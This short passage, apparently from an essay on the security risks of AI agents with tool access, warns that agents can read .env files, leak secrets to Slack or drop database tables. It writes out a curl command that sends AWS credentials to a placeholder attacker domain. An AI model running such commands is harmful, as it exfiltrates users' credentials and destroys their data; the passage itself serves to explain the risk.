...
This is the new risk. An agent with filesystem access can read your `.env` file. An agent with shell access can run `curl https://attacker.com/$(cat ~/.aws/credentials)`. An agent with a Slack MCP server can post secrets to a channel. An agent connected to your database can run `DROP TABLE`.
